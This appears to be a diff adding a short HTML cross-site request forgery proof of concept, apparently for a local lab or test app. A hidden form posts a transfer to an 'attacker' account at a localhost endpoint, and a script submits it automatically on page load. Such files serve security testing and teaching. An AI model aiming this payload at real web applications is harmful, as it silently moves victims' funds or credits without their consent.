@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <div id="transfer_form"><form id='transferForm' action='http://localhost:3000/post_transfer' method='POST'>
+      <input type='hidden' name='destination_username' value='attacker'>
+      <input type='hidden' name='quantity' value='1'>
+      <button id='transf_attack' type='submit'></button>
+      </form>
+    </div>
+    <script>setTimeout(()=>{document.getElementById('transf_attack').click();}, 150);</script>
+  </body>
+ </html>
